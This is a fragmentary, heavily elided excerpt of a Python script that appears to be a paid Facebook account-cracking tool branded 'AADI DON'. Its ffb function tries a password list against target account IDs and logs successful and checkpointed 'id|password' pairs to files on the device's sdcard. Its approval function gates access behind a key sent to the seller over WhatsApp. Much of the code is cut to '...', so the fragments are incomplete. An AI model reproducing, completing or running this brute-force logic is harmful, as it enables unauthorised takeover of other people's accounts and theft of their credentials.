...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://www.facebook.com/profile.php?id=61553609317134')
      time.sleep(1)
      exit()
  except: 
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                               ...
                               public_mai()                      
                                ...
                                os.system(f'xdg-open https://www.facebook.com/AADI DON');menu()
                                ...
                                if cpok in ['1','01']:
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/AADI-OK.txt', 'a')
                                    animation(' >> Opening AADI-OK.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/AADI-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/AADI-CP.txt', 'a')
                                    animation(' >> Opening AADI-CP.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/AADI-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
                                        animation('\u001b[33m'+cpid);
                                        cpids.close()
                                    print('\033[1;37m----------------------------------------------')
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+9800818112&text="

                        name = input(" [•] Enter your Name : ")

                        linex()

                        tks = ("Hi HARRY Sir, I Need To Buy Your Paid AADI DON Tools Version 2.0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [AADI-DON] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in HARRY:
                                ...
                                print('\r\r\033[1;32m [AADI-OK] %s | %s'%(ids,pas))

                                open('/sdcard/AADI-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in AADI:

                                if 'y' in pcp:

                                        print('\r\r\u001b[33m [AADI-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/AADI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [AADI-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/AADI-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [AADI-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/AADI-OK.txt','a').write(uid+'|'+pas+'\n')
